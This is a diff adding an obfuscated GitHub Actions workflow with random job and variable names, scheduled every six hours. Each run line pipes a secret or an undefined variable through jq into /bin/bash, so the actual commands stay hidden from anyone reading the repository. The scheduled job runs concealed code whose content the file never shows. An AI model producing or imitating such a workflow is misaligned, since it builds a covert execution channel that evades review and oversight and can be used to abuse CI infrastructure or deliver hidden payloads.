@@ -1,0 +1,29 @@
+name: yangtuotai1728
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '1 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: yangtuotai1728
+        env:
+          cggtz22: ${{ secrets.cggtz22 }}
+        run: |
+          echo $cggtz22 | jq -r .vsvq04 | /bin/bash
+          echo $yswdr753 | jq -r .vrrr1 | /bin/bash
+          echo $wbvv694 | jq -r .ru77 | /bin/bash
+          echo $rwncs7791 | jq -r .dnny44777 | /bin/bash
+          echo $u3 | jq -r .gzr12288 | /bin/bash
+          echo $gkzbw25 | jq -r .tuvun9938 | /bin/bash
+          echo $se68 | jq -r .pq64558 | /bin/bash
+          echo $gu8821 | jq -r .i44644 | /bin/bash
+          echo $fke3115 | jq -r .g58421 | /bin/bash
+          echo $nfdh23007 | jq -r .w93 | /bin/bash
+          echo $g91197 | jq -r .ew087 | /bin/bash
+          echo $scyjm69 | jq -r .wrwd9 | /bin/bash
+
